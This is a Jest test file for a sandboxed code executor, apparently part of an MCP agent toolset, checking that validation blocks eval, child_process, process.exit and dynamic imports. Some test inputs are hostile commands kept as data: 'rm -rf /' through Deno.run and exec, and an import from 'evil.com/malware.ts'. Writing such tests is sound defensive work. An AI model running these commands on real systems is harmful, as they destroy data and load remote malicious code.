/**
 * Tests for MCP Executor
 */

import { executeCode } from '../executor';
import { ExecutionContext } from '../types';

describe('Code Executor', () => {
  const context: ExecutionContext = {
    customerId: 'cust_test_123',
    domain: 'test.com',
    conversationId: 'conv_123',
    platform: 'generic'
  };

  describe('executeCode', () => {
    it('should reject code that fails validation', async () => {
      const code = `eval("malicious code");`;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('eval()'))).toBe(true);
    });

    it('should reject code with forbidden imports', async () => {
      const code = `import axios from 'axios';`;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('Forbidden import') || e.includes('npm imports'))).toBe(true);
    });

    it('should reject code with syntax errors', async () => {
      const code = `function test() { return 5;`;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('Unbalanced braces'))).toBe(true);
    });

    it('should include execution metadata', async () => {
      const code = `eval("test");`;
      const result = await executeCode(code, context);

      expect(result.metadata).toBeDefined();
      expect(result.metadata.executionTime).toBeGreaterThanOrEqual(0);
      expect(typeof result.metadata.executionTime).toBe('number');
    });

    it('should handle validation with multiple errors', async () => {
      const code = `
        import axios from 'axios';
        function test() { return eval('bad';
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(result.error?.details?.length).toBeGreaterThan(1);
    });

    it('should reject attempts to escalate permissions', async () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        Deno.run({ cmd: ["rm", "-rf", "/"] });
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('Deno.run'))).toBe(true);
    });

    it('should reject process.exit calls', async () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        process.exit(1);
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error?.code).toBe('VALIDATION_FAILED');
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('exit()'))).toBe(true);
    });

    it('should apply custom timeout options', async () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        const results = await searchProducts({ query: 'test', limit: 10 });
      `;
      const options = { timeout: 5000 };
      const result = await executeCode(code, context, options);

      // Should fail validation (assuming searchProducts server doesn't exist)
      // but should respect the timeout
      expect(result.metadata.executionTime).toBeLessThan(10000);
    });

    it('should pass context to executed code', async () => {
      // This would require Deno to be installed and servers to exist
      // We're testing that the context is properly formatted
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        const ctx = getContext();
        console.log(JSON.stringify({ customerId: ctx.customerId }));
      `;
      const result = await executeCode(code, context);

      // Will fail validation due to missing server, but context should be formatted
      expect(result).toBeDefined();
    });
  });

  describe('error handling', () => {
    it('should handle unknown errors gracefully', async () => {
      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        throw new Error("Custom error");
      `;
      const result = await executeCode(code, context);

      expect(result).toBeDefined();
      expect(result.metadata.executionTime).toBeGreaterThanOrEqual(0);
    });

    it('should provide structured error responses', async () => {
      const code = `eval("test");`;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error?.code).toBeDefined();
      expect(result.error?.message).toBeDefined();
      expect(result.error?.details).toBeDefined();
    });
  });

  describe('security', () => {
    it('should block child_process imports', async () => {
      const code = `
        import { exec } from 'child_process';
        exec("rm -rf /");
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('child_process'))).toBe(true);
    });

    it('should block dynamic imports', async () => {
      const code = `
        const userInput = "https://evil.com/malware.ts";
        const mod = await import(userInput);
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('Dynamic import()'))).toBe(true);
    });

    it('should block Function constructor', async () => {
      const code = `
        const fn = new Function("a", "b", "return a + b");
        fn(1, 2);
      `;
      const result = await executeCode(code, context);

      expect(result.success).toBe(false);
      expect(Array.isArray(result.error?.details)).toBe(true);
      expect((result.error?.details as string[]).some(e => e.includes('Function()'))).toBe(true);
    });
  });

  describe('context injection', () => {
    it('should include all context fields', async () => {
      const fullContext: ExecutionContext = {
        customerId: 'cust_123',
        domain: 'example.com',
        conversationId: 'conv_456',
        userId: 'user_789',
        platform: 'woocommerce',
        traceId: 'trace_abc',
        metadata: {
          test: 'value',
          nested: { key: 'value' }
        }
      };

      const code = `
        import { searchProducts } from './servers/search/searchProducts';
        const ctx = getContext();
      `;
      const result = await executeCode(code, fullContext);

      // Should have context formatted in the code
      expect(result).toBeDefined();
    });
  });
});
